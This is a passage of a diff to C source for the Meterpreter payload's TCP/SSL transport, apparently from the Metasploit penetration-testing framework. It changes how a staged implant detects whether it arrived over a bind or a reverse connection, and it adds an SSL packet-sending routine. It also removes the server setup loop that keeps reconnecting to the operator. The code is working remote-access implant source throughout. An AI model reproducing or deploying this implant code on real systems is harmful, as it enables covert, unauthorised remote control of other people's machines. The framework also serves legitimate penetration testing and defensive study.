+		return ((TcpTransportContext*)transport->ctx)->fd;
+	}
+
+	return 0;
 }
 
 /*!
@@ -972,12 +906,12 @@ static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
 
 	// then, to be horrible, we need to figure out the direction of the connection. To do this, we will
 	// Loop backwards from our current socket FD number
-	for (int i = 1; i <= 64; ++i)
+	for (int i = 1; i <= 16; ++i)
 	{
 		// Windows socket handles are always multiples of 4 apart.
-		listenSocket = ctx->fd - i;
+		listenSocket = ctx->fd - i * 4;
 
-		dprintf("[STAGED] Checking socket fd %u", listenSocket);
+		vdprintf("[STAGED] Checking socket fd %u", listenSocket);
 
 		BOOL isListening = FALSE;
 		int isListeningLen = sizeof(isListening);
@@ -1014,7 +948,7 @@ static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
 		{
 			if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
 			{
-				dprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
+				vdprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
 				ctx->bound = TRUE;
 				break;
 			}
@@ -1024,7 +958,7 @@ static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
 		{
 			if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
 			{
-				dprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
+				vdprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
 				ctx->bound = TRUE;
 				break;
 			}
@@ -1071,15 +1005,18 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 {
 	DWORD result = ERROR_SUCCESS;
 	size_t charsConverted;
+	char asciiUrl[512];
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
-	char* asciiUrl = remote->transport->url;
+
+	wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), remote->transport->url, sizeof(asciiUrl)-1);
+
+	dprintf("[TCP CONFIGURE] Url: %S", remote->transport->url);
 
 	remote->transport->start_time = current_unix_timestamp();
 	remote->transport->comms_last_packet = current_unix_timestamp();
 
 	if (strncmp(asciiUrl, "tcp", 3) == 0)
 	{
-		const int iRetryAttempts = 30;
 		char* pHost = strstr(asciiUrl, "//") + 2;
 		char* pPort = strrchr(pHost, ':') + 1;
 
@@ -1123,14 +1060,14 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 			dprintf("[STAGED] previous connection was a bind connection");
 			SOCKET listenSocket = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
 
-			result = bind_tcp_run(listenSocket, (struct sockaddr*)&ctx->sock_desc, ctx->sock_desc_size, &ctx->fd);
+			result = bind_tcp_run(listenSocket, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size, &ctx->fd);
 		}
 		else
 		{
 			dprintf("[STAGED] previous connection was a reverse connection");
 			ctx->fd = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
 
-			result = reverse_tcp_run(ctx->fd, (struct sockaddr*)&ctx->sock_desc, ctx->sock_desc_size,
+			result = reverse_tcp_run(ctx->fd, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size,
 				remote->transport->timeouts.retry_total, remote->transport->timeouts.retry_wait,
 				remote->transport->expiration_end);
 
@@ -1149,35 +1086,29 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 		infer_staged_connection_type(ctx, sock);
 	}
 
-	if (result != ERROR_SUCCESS) {
+	if (result != ERROR_SUCCESS)
+	{
+		dprintf("[SERVER] Something went wrong %u", result);
 		return FALSE;
 	}
+
+	dprintf("[SERVER] Looking good, FORWARD!");
+
 	// Do not allow the file descriptor to be inherited by child processes
 	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
 
 	dprintf("[SERVER] Flushing the socket handle...");
 	server_socket_flush(remote);
 
-	// TODO: remove this when stageless stuff happens.
-	// if we've just "reconnected" then we're going to flush
-	// the socket a second time beacuse the second stage is
-	// coming down and we don't want it!
-	if (ctx->sock_desc_size > 0)
-	{
-		server_socket_flush(remote);
-	}
-
 	dprintf("[SERVER] Initializing SSL...");
-	if (server_initialize_ssl(remote))
+	if (!server_initialize_ssl(remote))
 	{
-		dprintf("[SERVER] SSL failed to initialize");
 		return FALSE;
 	}
 
 	dprintf("[SERVER] Negotiating SSL...");
 	if (!server_negotiate_ssl(remote))
 	{
-		dprintf("[SERVER] Failed to negotiate SSL");
 		return FALSE;
 	}
 
@@ -1185,18 +1116,134 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 }
 
 /*!
- * @brief Get the socket from the transport (if it's TCP).
- * @param transport Pointer to the TCP transport containing the socket.
- * @return The current transport socket FD, if any, or zero.
+ * @brief Transmit a packet via SSL _and_ destroy it.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the \c Packet that is to be sent.
+ * @param completion Pointer to the completion routines to process.
+ * @return An indication of the result of processing the transmission request.
+ * @remark This uses an SSL-encrypted TCP channel, and does not imply the use of HTTPS.
  */
-static SOCKET transport_get_socket_tcp(Transport* transport)
+DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
 {
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	CryptoContext* crypto;
+	Tlv requestId;
+	DWORD res;
+	DWORD idx;
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+
+	lock_acquire(remote->lock);
+
+	// If the packet does not already have a request identifier, create one for it
+	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
 	{
-		return ((TcpTransportContext*)transport->ctx)->fd;
+		DWORD index;
+		CHAR rid[32];
+
+		rid[sizeof(rid)-1] = 0;
+
+		for (index = 0; index < sizeof(rid)-1; index++)
+		{
+			rid[index] = (rand() % 0x5e) + 0x21;
+		}
+
+		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
 	}
 
-	return 0;
+	do
+	{
+		// If a completion routine was supplied and the packet has a request
+		// identifier, insert the completion routine into the list
+		if ((completion) &&
+			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
+			&requestId) == ERROR_SUCCESS))
+		{
+			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
+		}
+
+		// If the endpoint has a cipher established and this is not a plaintext
+		// packet, we encrypt
+		if ((crypto = remote_get_cipher(remote)) &&
+			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
+			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
+		{
+			ULONG origPayloadLength = packet->payloadLength;
+			PUCHAR origPayload = packet->payload;
+
+			// Encrypt
+			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
+				packet->payloadLength, &packet->payload,
+				&packet->payloadLength)) !=
+				ERROR_SUCCESS)
+			{
+				SetLastError(res);
+				break;
+			}
+
+			// Destroy the original payload as we no longer need it
+			free(origPayload);
+
+			// Update the header length
+			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
+		}
+
+		idx = 0;
+		while (idx < sizeof(packet->header))
+		{
+			// Transmit the packet's header (length, type)
+			res = SSL_write(
+				ctx->ssl,
+				(LPCSTR)(&packet->header) + idx,
+				sizeof(packet->header) - idx
+				);
+
+			if (res <= 0)
+			{
+				dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
+				break;
+			}
+			idx += res;
+		}
+
+		if (res < 0)
+		{
+			break;
+		}
+
+		idx = 0;
+		while (idx < packet->payloadLength)
+		{
+			// Transmit the packet's payload (length, type)
+			res = SSL_write(
+				ctx->ssl,
+				packet->payload + idx,
+				packet->payloadLength - idx
+				);
+
+			if (res < 0)
+			{
+				break;
+			}
+
+			idx += res;
+		}
+
+		if (res < 0)
+		{
+			dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
+			break;
+		}
+
+		SetLastError(ERROR_SUCCESS);
+	} while (0);
+
+	res = GetLastError();
+
+	// Destroy the packet
+	packet_destroy(packet);
+
+	lock_release(remote->lock);
+
+	return res;
 }
 
 /*!
@@ -1205,7 +1252,7 @@ static SOCKET transport_get_socket_tcp(Transport* transport)
  * @param timeouts The timeout values to use for this transport.
  * @return Pointer to the newly configured/created TCP transport instance.
  */
-Transport* transport_create_tcp(char* url, TimeoutSettings* timeouts)
+Transport* transport_create_tcp(wchar_t* url, TimeoutSettings* timeouts)
 {
 	Transport* transport = (Transport*)malloc(sizeof(Transport));
 	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
@@ -1218,7 +1265,7 @@ Transport* transport_create_tcp(char* url, TimeoutSettings* timeouts)
 	memcpy(&transport->timeouts, timeouts, sizeof(transport->timeouts));
 
 	transport->type = METERPRETER_TRANSPORT_SSL;
-	transport->url = strdup(url);
+	transport->url = _wcsdup(url);
 	transport->packet_transmit = packet_transmit_via_ssl;
 	transport->transport_init = configure_tcp_connection;
 	transport->transport_deinit = server_destroy_ssl;
@@ -1234,141 +1281,3 @@ Transport* transport_create_tcp(char* url, TimeoutSettings* timeouts)
 	return transport;
 }
 
-/*!
- * @brief Create a new transport based on the given metsrv configuration.
- * @param config Pointer to the metsrv configuration block.
- * @param stageless Indication of whether the configuration is stageless.
- * @param fd The socket descriptor passed to metsrv during intialisation.
- */
-static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
-{
-	Transport* t = NULL;
-	char* transport = config->transport + TRANSPORT_ID_OFFSET;
-	char* url = config->url + (stageless ? 1 : 0);
-
-	dprintf("[TRANSPORT] Type = %s", transport);
-	dprintf("[TRANSPORT] URL = %s", url);
-
-	if (strcmp(transport, "SSL") == 0)
-	{
-		t = transport_create_tcp(url, &config->timeouts.values);
-	}
-	else
-	{
-		// one day we'll have http(s)
-	}
-
-	if (t) {
-		dprintf("[TRANSPORT] Comms timeout: %u %08x", t->timeouts.comms, t->timeouts.comms);
-		dprintf("[TRANSPORT] Session timeout: %u %08x", t->timeouts.expiry, t->timeouts.expiry);
-		dprintf("[TRANSPORT] Session expires: %u %08x", t->expiration_end, t->expiration_end);
-		dprintf("[TRANSPORT] Retry total: %u %08x", t->timeouts.retry_total, t->timeouts.retry_total);
-		dprintf("[TRANSPORT] Retry wait: %u %08x", t->timeouts.retry_wait, t->timeouts.retry_wait);
-	}
-
-	return t;
-}
-
-/*!
- * @brief Setup and run the server. This is called from Init via the loader.
- * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
- * @return Meterpreter exit code (ignored by the caller).
- */
-DWORD server_setup(SOCKET fd)
-{
-	THREAD * dispatchThread = NULL;
-	Remote *remote = NULL;
-	char cStationName[256] = { 0 };
-	char cDesktopName[256] = { 0 };
-	DWORD res = 0;
-
-	dprintf("[SERVER] Initializing...");
-	int local_error = 0;
-
-	srand(time(NULL));
-
-	printf("[SERVER] module loaded at 0x%08X", hAppInstance);
-
-	// Open a THREAD item for the servers main thread, we use this to manage migration later.
-	dispatchThread = thread_open();
-	dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X",
-		dispatchThread->handle, dispatchThread->id, dispatchThread->sigterm);
-
-	if (!(remote = remote_allocate())) {
-		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-		goto out;
-	}
-
-	// Set up the transport creation function pointers.
-	remote->trans_create_tcp = transport_create_tcp;
-
-	// Store our thread handle
-	remote->server_thread = dispatchThread->handle;
-
-	dprintf("[SERVER] Registering dispatch routines...");
-	register_dispatch_routines();
-
-	// allocate the "next transport" information
-	dprintf("[SERVER] creating transport");
-	remote->next_transport = transport_create(&global_config, FALSE);
-
-	while (remote->next_transport)
-	{
-		// Work off the next transport
-		remote->transport = remote->next_transport;
-
-		if (remote->transport->transport_init)
-		{
-			dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport->transport_init);
-			// Each transport has its own set of retry settings and each should honour
-			// them individually.
-			if (!remote->transport->transport_init(remote, fd))
-			{
-				dprintf("[SERVER] transport initialisation failed.");
-
-				// when we have a list of transports, we'll iterate to the next one.
-				break;
-			}
-		}
-
-		// once initialised, we'll clean up the next transport so that we don't try again
-		remote->next_transport = NULL;
-
-		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
-		DWORD dispatchResult = remote->transport->server_dispatch(remote, dispatchThread);
-
-		if (remote->transport->transport_deinit)
-		{
-			remote->transport->transport_deinit(remote);
-		}
-
-		// If the transport mechanism failed, then we should loop until we're able to connect back again.
-		// But if it was successful, and this is a valid exit, then we should clean up and leave.
-		if (dispatchResult == ERROR_SUCCESS)
-		{
-			remote->transport->transport_destroy(remote);
-		}
-		else
-		{
-			// try again!
-			if (remote->transport->transport_reset)
-			{
-				remote->transport->transport_reset(remote->transport);
-			}
-
-			// when we have a list of transports, we'll iterate to the next one (perhaps?)
-			remote->next_transport = remote->transport;
-		}
-	}
-
-	dprintf("[SERVER] Deregistering dispatch routines...");
-	deregister_dispatch_routines(remote);
-
-	remote_deallocate(remote);
-
-out:
-	res = GetLastError();
-
-	dprintf("[SERVER] Finished.");
-	return res == ERROR_SUCCESS;
-}
